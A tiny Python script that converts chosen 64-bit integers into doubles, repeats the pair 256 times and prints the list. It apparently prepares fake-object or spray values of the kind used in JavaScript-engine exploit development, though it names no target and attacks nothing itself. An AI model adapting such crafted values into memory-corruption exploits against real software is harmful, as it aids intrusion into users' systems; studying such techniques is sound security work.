#!/usr/bin/env python3

import struct


def itof(x):
    return struct.unpack("<d", struct.pack("<Q", x))[0]


arr = []
arr.append(itof((0x000006cd) << 32 | 0x0018ece1))
arr.append(itof((0x00010000) << 32 | 0x2c3169))

arr = arr * 256
print(arr)
